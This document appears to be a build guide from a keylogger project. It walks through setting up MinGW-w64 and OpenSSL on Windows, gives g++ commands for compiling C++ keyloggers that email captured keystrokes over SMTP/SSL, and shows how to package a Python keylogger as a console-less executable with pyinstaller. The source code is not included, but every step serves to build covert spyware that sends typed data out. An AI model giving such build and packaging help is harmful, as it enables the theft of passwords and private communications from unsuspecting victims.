# C++ Build Environment Setup

To compile the C++ version of the keylogger on Windows, you need a C++ compiler (`g++`) and the OpenSSL libraries.

## 1. Install MinGW-w64 (via MSYS2)

The recommended way to get `g++` on Windows is through **MSYS2**.

1.  Download and run the installer from [msys2.org](https://www.msys2.org/).
2.  Open the **MSYS2 MINGW64** terminal from the Start menu.
3.  Update the package database:
    ```bash
    pacman -Syu
    ```
4.  Install the MinGW-w64 toolchain:
    ```bash
    pacman -S --needed base-devel mingw-w64-x86_64-toolchain
    ```
5.  Add `C:\msys64\mingw64\bin` to your system **PATH** environment variable.

## 2. Install OpenSSL Libraries

If you want to use the version of the keylogger that supports direct SMTP over SSL (`keylogger.cpp`), you need OpenSSL.

1.  In the **MSYS2 MINGW64** terminal, run:
    ```bash
    pacman -S mingw-w64-x86_64-openssl
    ```

## 3. Compilation Commands

### Compiling the Standalone version (No external deps)
This version uses standard Windows APIs and logs to a local file if email fails.
```bash
g++ -o keylogger.exe keylogger_final.cpp -lws2_32 -liphlpapi -lole32 -luuid -lwinhttp -O2 -w
```

### Compiling the OpenSSL version (Requires OpenSSL)
This version supports direct SMTP over SSL.
```bash
g++ -o keylogger_secure.exe keylogger.cpp -lws2_32 -lwinhttp -lcrypt32 -lssl -lcrypto -static
```

## 4. Setting up Python Environment
If you prefer the Python version, ensure you have the dependencies:
```bash
pip install pynput requests
```
To create a standalone `.exe` from the Python script:
```bash
pip install pyinstaller
pyinstaller --onefile --noconsole pykelogger.py
```
